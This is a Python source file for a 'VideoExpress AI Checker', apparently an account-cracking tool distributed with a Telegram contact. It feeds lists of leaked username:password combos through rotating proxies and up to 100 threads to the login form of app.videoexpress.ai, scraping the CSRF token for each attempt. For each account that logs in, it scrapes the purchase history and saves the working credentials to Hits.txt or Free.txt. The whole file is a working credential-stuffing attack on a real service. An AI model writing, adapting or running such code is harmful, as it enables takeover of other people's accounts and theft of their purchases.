import sys, os, threading, time, httpx, queue, ctypes, colorama, random, re
from colorama import Fore, Style
from bs4 import BeautifulSoup

colorama.init(autoreset=True)
ctypes.windll.kernel32.SetConsoleTitleW("VideoExpress AI Checker - Made by Yashvir Gaming")
os.system('cls' if os.name == 'nt' else 'clear')

ART = [
"  ██╗   ██╗██╗██████╗ ███████╗ ██████╗ ███████╗██╗  ██╗██████╗ ██████╗ ███████╗███████╗███████╗    █████╗ ██╗",
"  ██║   ██║██║██╔══██╗██╔════╝██╔═══██╗██╔════╝╚██╗██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝   ██╔══██╗██║",
"  ██║   ██║██║██║  ██║█████╗  ██║   ██║█████╗   ╚███╔╝ ██████╔╝██████╔╝█████╗  ███████╗███████╗   ███████║██║",
"  ╚██╗ ██╔╝██║██║  ██║██╔══╝  ██║   ██║██╔══╝   ██╔██╗ ██╔═══╝ ██╔══██╗██╔══╝  ╚════██║╚════██║   ██╔══██║██║",
"   ╚████╔╝ ██║██████╔╝███████╗╚██████╔╝███████╗██╔╝ ██╗██║     ██║  ██║███████╗███████║███████║██╗██║  ██║██║",
"    ╚═══╝  ╚═╝╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝╚═╝  ╚═╝╚═╝",
"                                                                                                             "
]
SUBTITLE = "Made with ♥ By Yashvir Gaming".center(116)
THEME = [Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTBLUE_EX]

def center(txt, width=116):
    return txt.center(width)

def print_art():
    for idx, line in enumerate(ART):
        c = THEME[idx % len(THEME)]
        print(center(c + line))
    print(center(Fore.LIGHTWHITE_EX + Style.BRIGHT + SUBTITLE))
    print()

def pick_color(idx):
    return THEME[idx % len(THEME)]

def select_files(msg):
    print(center(Fore.LIGHTYELLOW_EX + msg))
    files = []
    while True:
        fn = input(center(Fore.LIGHTCYAN_EX + "Drop .txt file(s) or press Enter when done: ")).strip('" ')
        if not fn: break
        if os.path.isfile(fn):
            files.append(fn)
        else:
            print(center(Fore.LIGHTRED_EX + "Not found, try again."))
    return files

def ask_threads():
    while True:
        try:
            t = int(input(center(Fore.LIGHTCYAN_EX + "How many threads (max 100): ")))
            if 1 <= t <= 100: return t
        except: pass

def load_lines(files):
    combos = []
    for fn in files:
        with open(fn, encoding='utf-8', errors='ignore') as f:
            combos += [x.strip() for x in f if x.strip()]
    return combos

def load_proxies(files):
    proxies = []
    for fn in files:
        with open(fn, encoding='utf-8', errors='ignore') as f:
            proxies += [x.strip() for x in f if x.strip()]
    return proxies

def parse_proxy(proxy):
    if '@' in proxy:
        return f'http://{proxy}'
    prx = proxy.split(':')
    if len(prx) == 4:
        host, port, user, pwd = prx
        return f'http://{user}:{pwd}@{host}:{port}'
    if len(prx) == 2:
        return f'http://{prx[0]}:{prx[1]}'
    return None

def make_proxy_dict(proxy):
    url = parse_proxy(proxy)
    if not url: return None
    return {"http://": url, "https://": url}

def cpm_counter(cpm_hist):
    now = int(time.time())
    cpm_hist = [t for t in cpm_hist if t > now - 60]
    return len(cpm_hist), cpm_hist

def print_stats(h,f,r,free,cpm, total, done):
    bar = "█" * int((done / total) * 40) + "░" * (40-int((done/total)*40))
    stats = f"{Fore.LIGHTGREEN_EX}Hits:{h}  {Fore.LIGHTRED_EX}Fails:{f}  {Fore.LIGHTYELLOW_EX}Retries:{r}  {Fore.LIGHTCYAN_EX}Free:{free}  {Fore.LIGHTMAGENTA_EX}CPM:{cpm}".ljust(90)
    progress = f"{Fore.LIGHTWHITE_EX}[{bar}] {done}/{total}"
    print(center(stats))
    print(center(progress))
    print()

def parse_csrf(html):
    soup = BeautifulSoup(html, "lxml")
    tag = soup.find('input', {'name': '_csrf_token'})
    if tag and tag.has_attr('value'):
        return tag['value']
    m = re.search(r'name=["\']_csrf_token["\']\s+value=["\']([a-zA-Z0-9_\-\.\@]+)["\']', html)
    if m:
        return m.group(1)
    m2 = re.search(r'name=["\']_csrf_token["\'][^>]*value=["\']([^"\']+)["\']', html)
    if m2:
        return m2.group(1)
    m3 = re.search(r'_csrf_token"\s*value="([^"]+)"', html)
    if m3:
        return m3.group(1)
    return None

def parse_orders(html):
    if "Purchases not found." in html: return False, []
    soup = BeautifulSoup(html, "lxml")
    strongs = soup.select("table.table.table-bordered.table-hover tr td strong")
    cap = [x.text.strip() for x in strongs if x.text.strip()]
    return bool(cap), cap

def worker(q, proxies, results, lock, cpm_hist, total):
    while True:
        try:
            combo = q.get(timeout=5)
        except: break
        user, pwd = combo.split(':',1)
        pxy = random.choice(proxies) if proxies else None
        proxy_dict = make_proxy_dict(pxy) if pxy else None
        session = httpx.Client(proxies=proxy_dict, http2=False, timeout=25) if proxy_dict else httpx.Client(http2=False, timeout=25)
        headers1 = {
            "Host": "app.videoexpress.ai",
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://app.videoexpress.ai/login",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate"
        }
        try:
            resp1 = session.get("https://app.videoexpress.ai/login", headers=headers1)
            csrf = parse_csrf(resp1.text)
            if not csrf:
                with open("login_debug.html", "w", encoding="utf-8") as f:
                    f.write(resp1.text)
                raise Exception("CSRF parse fail")
            headers2 = headers1.copy()
            headers2["Origin"] = "https://app.videoexpress.ai"
            headers2["Content-Type"] = "application/x-www-form-urlencoded"
            post_data = f"_csrf_token={csrf}&_username={user}&_password={pwd}"
            resp2 = session.post("https://app.videoexpress.ai/login_check", content=post_data, headers=headers2, follow_redirects=False)
            status = "True" if "Location" in resp2.headers and "login" not in resp2.headers["Location"] else "False"
            if status == "True":
                headers3 = headers2.copy()
                headers3["Referer"] = "https://app.videoexpress.ai/delivery"
                post2 = f"email={user}"
                resp3 = session.post("https://app.videoexpress.ai/delivery", content=post2, headers=headers3)
                has_orders, purchases = parse_orders(resp3.text)
                if has_orders:
                    purchases_str = f"[{', '.join(purchases)}]" if purchases else "[]"
                    capture = f"{user}:{pwd} | Status: {status} | Has Orders: {has_orders} | Your purchases: {purchases_str}"
                    with lock:
                        results['hits'] += 1
                        cpm_hist.append(int(time.time()))
                        with open("Hits.txt","a",encoding='utf-8') as fw: fw.write(capture + "\n")
                        print(center(pick_color(results['hits']) + "[HIT] " + capture))
                else:
                    with lock:
                        results['free'] += 1
                        with open("Free.txt","a",encoding='utf-8') as fw: fw.write(f"{user}:{pwd}\n")
                        print(center(Fore.LIGHTCYAN_EX + f"[FREE] {user}:{pwd}"))

            else:
                with lock:
                    results['fails'] += 1
                    print(center(Fore.LIGHTRED_EX + f"[FAIL] {user}:{pwd}"))
        except Exception as ex:
            with lock:
                results['retries'] += 1
                print(center(Fore.LIGHTYELLOW_EX + f"[RETRY] {user}:{pwd} | {str(ex)}"))
            q.put(combo)
        finally:
            with lock:
                results['done'] += 1
        q.task_done()

def main():
    print_art()
    print(center(Fore.LIGHTYELLOW_EX + "Telegram for help: https://t.me/therealyashvirgaming"))
    combo_files = select_files("Drop combo .txt files (user:pass) — can multi-select")
    combos = load_lines(combo_files)
    proxy_files = select_files("Drop proxy .txt files (leave blank for proxyless)")
    proxies = load_proxies(proxy_files) if proxy_files else []
    threads = ask_threads()
    q = queue.Queue()
    for combo in combos: q.put(combo)
    results = {'hits':0, 'fails':0, 'retries':0, 'free':0, 'done':0}
    cpm_hist = []
    lock = threading.Lock()
    total = len(combos)
    print(center(Fore.LIGHTGREEN_EX + f"[+] Loaded {total} combos"))
    if proxies: print(center(Fore.LIGHTBLUE_EX + f"[+] Loaded {len(proxies)} proxies"))
    else: print(center(Fore.LIGHTYELLOW_EX + "[Proxyless Mode]"))
    print(center(Fore.LIGHTCYAN_EX + f"[+] Threads: {threads}"))
    print(center(Fore.LIGHTMAGENTA_EX + "[+] Starting...\n"))
    ts = []
    for _ in range(threads):
        t = threading.Thread(target=worker, args=(q, proxies, results, lock, cpm_hist, total), daemon=True)
        t.start()
        ts.append(t)
    while any(t.is_alive() for t in ts):
        time.sleep(1)
        with lock:
            cpm, cpm_hist[:] = cpm_counter(cpm_hist)
            os.system('cls' if os.name == 'nt' else 'clear')
            print_art()
            print_stats(results['hits'], results['fails'], results['retries'], results['free'], cpm, total, results['done'])
    q.join()
    with lock:
        cpm, _ = cpm_counter(cpm_hist)
        print(center(Fore.LIGHTGREEN_EX + f"\nDone! Hits:{results['hits']} Free:{results['free']} Fails:{results['fails']} CPM:{cpm}"))
        print(center(Fore.LIGHTCYAN_EX + "Telegram: https://t.me/therealyashvirgaming\n"))
    input(center("Press Enter to exit..."))

if __name__ == "__main__":
    main()
